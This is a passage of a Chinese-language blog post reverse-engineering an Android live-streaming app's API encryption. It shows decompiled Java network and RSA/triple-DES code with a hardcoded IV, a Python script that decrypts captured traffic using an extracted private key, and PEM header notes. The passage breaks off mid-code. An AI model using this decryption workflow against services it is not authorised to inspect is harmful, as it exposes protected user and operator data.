class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_MOBILE_STATISTIC_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_NOBILITY_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/nobility/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_POPULARITY_CARD</span> <span class="operator">=</span> <span class="string">&quot;tl/shop/myPopularityCard/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_REPORT_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/offence/offenceContent/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_SHOP_CAR_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/shop/car/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_SHOP_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/shop/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STATISTIC_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STATISTIC_USER_EXPENSE_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/user/expense/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_ANCHOR_PRODUCT_ITEM_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/anchor/productItem/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_ANCHOR_PRODUCT_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/anchor/product/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_ANCHOR_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_PRODUCT_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/product/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_USER_PRODUCT_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/user/product/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STORE_USER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/store/user/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_STREAM_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/streams/stream/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_TURNTABLE_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/turntable/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_USER_ANCHOR_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_USER_EXPENSE_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/mobile/user/expense&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_USER_MOBILE_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/userService/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_USER_MOBILE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_USER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_USER_CHAT_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/chat/userMark/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_USER_MARK_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/userMark/&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@POST(&quot;tl/index/live/list&quot;)</span></span><br><span class="line">    Observable&lt;HttpResultModel&lt;HttpResultPageModel&lt;LiveEntity&gt;&gt;&gt; <span class="title function_">getAllListService</span><span class="params">(<span class="meta">@Body</span> Map&lt;String, Object&gt; map)</span>;</span><br></pre></td></tr></table></figure><p>最后一行就是了，传入一个 map 返回一个 Observable，然后就可以对这个 Observable 在观察了。<br>这就和最开始在<code>TomatoLiveSDK</code>中看到对上了。<br>下面再看最关键的<code>CustomGsonConverterFactory.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomGsonConverterFactory</span> <span class="keyword">extends</span> <span class="title class_">Converter</span>.Factory &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// retrofit2.Converter.Factory</span></span><br><span class="line">    <span class="keyword">public</span> Converter&lt;ResponseBody, ?&gt; responseBodyConverter(Type type, Annotation[] annotationArr, Retrofit retrofit) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CustomGsonResponseBodyConverter</span>(<span class="built_in">this</span>.gson, <span class="built_in">this</span>.gson.getAdapter(TypeToken.get(type)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomGsonResponseBodyConverter</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Converter</span>&lt;ResponseBody, T&gt; &#123;</span><br><span class="line">    CustomGsonResponseBodyConverter(Gson gson2, TypeAdapter&lt;T&gt; typeAdapter) &#123;</span><br><span class="line">        <span class="built_in">this</span>.gson = gson2;</span><br><span class="line">        <span class="built_in">this</span>.adapter = typeAdapter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">convert</span><span class="params">(<span class="meta">@NonNull</span> ResponseBody responseBody)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> responseBody.string();</span><br><span class="line">        <span class="type">JsonParser</span> <span class="variable">jsonParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonParser</span>();</span><br><span class="line">        <span class="keyword">if</span> (isEncrypt(jsonParser, string)) &#123;</span><br><span class="line">            <span class="type">EncryptHttpResultModel</span> <span class="variable">encryptHttpResultModel</span> <span class="operator">=</span> (EncryptHttpResultModel) <span class="built_in">this</span>.gson.fromJson(string, (Class) EncryptHttpResultModel.class);</span><br><span class="line">            <span class="type">ResultMode</span> <span class="variable">resultMode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResultMode</span>();</span><br><span class="line">            resultMode.code = encryptHttpResultModel.getCode();</span><br><span class="line">            resultMode.msg = encryptHttpResultModel.getMessage();</span><br><span class="line">            <span class="type">String</span> <span class="variable">jsonData</span> <span class="operator">=</span> encryptHttpResultModel.getJsonData();</span><br><span class="line">            <span class="keyword">if</span> (jsonParser.parse(jsonData).isJsonArray()) &#123;</span><br><span class="line">                resultMode.data = <span class="keyword">new</span> <span class="title class_">JsonParser</span>().parse(jsonData).getAsJsonArray();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultMode.data = <span class="keyword">new</span> <span class="title class_">JsonParser</span>().parse(jsonData).getAsJsonObject();</span><br><span class="line">            &#125;</span><br><span class="line">            string = <span class="built_in">this</span>.gson.toJson(resultMode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ResultMode</span> <span class="variable">resultMode2</span> <span class="operator">=</span> (ResultMode) <span class="built_in">this</span>.gson.fromJson(string, (Class) ResultMode.class);</span><br><span class="line">            <span class="keyword">if</span> (resultMode2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (AppUtils.isTokenInvalidErrorCode(resultMode2.getCode())) &#123;</span><br><span class="line">                    responseBody.close();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerException</span>(resultMode2.getCode(), resultMode2.getMsg());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.adapter.fromJson(string);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            responseBody.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomGsonResponseBodyConverter</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Converter</span>&lt;ResponseBody, T&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EncryptMode</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String data;</span><br><span class="line">        <span class="keyword">public</span> String key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getJsonData</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">return</span> EncryptUtil.DESDecrypt(EncryptUtil.RSADecrypt(TomatoLiveSDK.getSingleton().ENCRYPT_API_KEY, <span class="built_in">this</span>.key), <span class="built_in">this</span>.data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncryptUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CHARSET</span> <span class="operator">=</span> <span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="string">&quot;01234567&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">EncryptUtil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">DESDecrypt</span><span class="params">(String str, String str2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> decode(str, str2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">RSADecrypt</span><span class="params">(String str, String str2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decrypt(decode(str2), getPraivateKey(str), <span class="number">2048</span>, <span class="number">11</span>, <span class="string">&quot;RSA/ECB/PKCS1Padding&quot;</span>), CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String str, String str2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">generateSecret</span> <span class="operator">=</span> SecretKeyFactory.getInstance(<span class="string">&quot;desede&quot;</span>).generateSecret(<span class="keyword">new</span> <span class="title class_">DESedeKeySpec</span>(str.getBytes()));</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">instance</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;desede/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        instance.init(<span class="number">2</span>, generateSecret, <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(instance.doFinal(decode(str2)), CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Base64Util.decode(str, <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>在来一段 python 的实现，这段代码写了好几个小时，因为 DES3 的坑。<br>Java的desede是不会对key检测的，直接暴力截断；python中需要检测16&#x2F;24位，否则报错<code>ValueError: Not a valid TDES key</code></p><ul><li>str(bytes) 这是不标准的用法，打印出来看的很清楚，前面有 b 字符串也被单引号引起来了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, AES, DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pri = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">pri, ciphertext</span>):</span><br><span class="line">    key = RSA.importKey(pri)</span><br><span class="line">    dsize = SHA.digest_size</span><br><span class="line">    input_text = ciphertext[:<span class="number">256</span>]</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> input_text:</span><br><span class="line">        sentinel = Random.new().read(<span class="number">15</span> + dsize)</span><br><span class="line">        cipher = PKCS1_v1_5.new(key)</span><br><span class="line">        _message = cipher.decrypt(input_text, sentinel)</span><br><span class="line">        ret += <span class="built_in">str</span>(_message)</span><br><span class="line">        ciphertext = ciphertext[<span class="number">256</span>:]</span><br><span class="line">        input_text = ciphertext[:<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">msg = b64decode(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">msg = decrypt(pri, msg)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line">ct = b64decode(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = DES3.new(msg[<span class="number">2</span>:<span class="number">26</span>], DES3.MODE_CBC, iv=<span class="string">b&#x27;01234567&#x27;</span>)</span><br><span class="line">plain = cipher.decrypt(ct).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plain = plain[:plain.rfind(<span class="string">&#x27;&#125;&#x27;</span>)+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;decode.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">f.write(plain)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h4 id="PEM-header"><a href="#PEM-header" class="headerlink" title="PEM header"></a>PEM header</h4><p>这里有一点需要注意，RSA 私钥的 pem header 问题，会导致部分网页版无法工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_OLD <span class="string">&quot;X509 CERTIFICATE&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509     <span class="string">&quot;CERTIFICATE&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_PAIR    <span class="string">&quot;CERTIFICATE PAIR&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_TRUSTED <span class="string">&quot;TRUSTED CERTIFICATE&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_REQ_OLD <span class="string">&quot;NEW CERTIFICATE REQUEST&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_REQ <span class="string">&quot;CERTIFICATE REQUEST&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_X509_CRL <span class="string">&quot;X509 CRL&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_EVP_PKEY <span class="string">&quot;ANY PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PUBLIC   <span class="string">&quot;PUBLIC KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_RSA      <span class="string">&quot;RSA PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_RSA_PUBLIC   <span class="string">&quot;RSA PUBLIC KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_DSA      <span class="string">&quot;DSA PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_DSA_PUBLIC   <span class="string">&quot;DSA PUBLIC KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PKCS7    <span class="string">&quot;PKCS7&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PKCS7_SIGNED <span class="string">&quot;PKCS #7 SIGNED DATA&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PKCS8    <span class="string">&quot;ENCRYPTED PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PKCS8INF <span class="string">&quot;PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_DHPARAMS <span class="string">&quot;DH PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_DHXPARAMS    <span class="string">&quot;X9.42 DH PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_SSL_SESSION  <span class="string">&quot;SSL SESSION PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_DSAPARAMS    <span class="string">&quot;DSA PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_ECDSA_PUBLIC <span class="string">&quot;ECDSA PUBLIC KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_ECPARAMETERS <span class="string">&quot;EC PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_ECPRIVATEKEY <span class="string">&quot;EC PRIVATE KEY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_PARAMETERS   <span class="string">&quot;PARAMETERS&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PEM_STRING_CMS      <span class="string">&quot;CMS&quot;</span></span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://git.openssl.org/?p=openssl.git;a=blob;f=include/openssl/pem.h;hb=HEAD#l30">https://git.openssl.org/?p=openssl.git;a=blob;f=include/openssl/pem.h;hb=HEAD#l30</a></p><h3 id="AppSecretUtil"><a href="#AppSecretUtil" class="headerlink" title="AppSecretUtil"></a>AppSecretUtil</h3><p>昨天已经分析了直播的api加密，都在<code>com.tomatolive</code>这个类中，用到的加密是RSA和DES3。<br>今天准备先干掉flv的加密来着，但没找到头绪，决定先干<code>首页/游戏/papa</code>的各种 api。<br>通过抓包，发现关于该api的几乎所有内容全都是加密的。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/clubapicap.png' data-fancybox='default' data-caption='clubapicap.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/clubapicap.png" class="lazyload" data-srcset="/img/2022/tomato/clubapicap.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="clubapicap.png"></a><span class='image-caption'>clubapicap.png</span></div></div><p>往上翻，看看最开始请求有什么线索，找到该api请求的第一条，抓到的包如下，是一条<code>json</code>，但内容也是加密的。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/clubapijson.png' data-fancybox='default' data-caption='clubapijson.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/clubapijson.png" class="lazyload" data-srcset="/img/2022/tomato/clubapijson.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="clubapijson.png"></a><span class='image-caption'>clubapijson.png</span></div></div><p>不过很显然，这条请求用于获取各类域名。<br>本来想从<code>MainTabActivity</code>一步步启动到如何做出请求，返回的数据如何解密，但实在看不懂流程应该是怎样的。<br>用个土办法吧。搜索关键词<code>.do</code>，直接就定位到了<code>AppSecretUtil.java</code>，这是个关键的解密函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppSecretUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] apiPaths = &#123;<span class="string">&quot;/order&quot;</span>, <span class="string">&quot;/pay&quot;</span>, <span class="string">&quot;/query&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decodeResponse</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] charArray = str.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span 